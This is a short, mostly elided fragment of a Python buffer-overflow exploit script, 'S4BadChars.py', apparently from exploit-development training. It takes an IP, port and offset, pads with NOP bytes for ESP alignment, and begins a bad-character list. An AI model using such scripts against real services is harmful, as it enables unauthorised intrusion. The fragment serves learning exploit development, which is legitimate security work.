...
#usage ./S4BadChars.py {IP} {port} {offset}
...
try:
	...
	buffer += b"\x90" * 8 #This padding gets us alignment with out bad chars and the esp
	
	#Bad char list \x00 
	#this is a list of all characters take bad characters as they are found
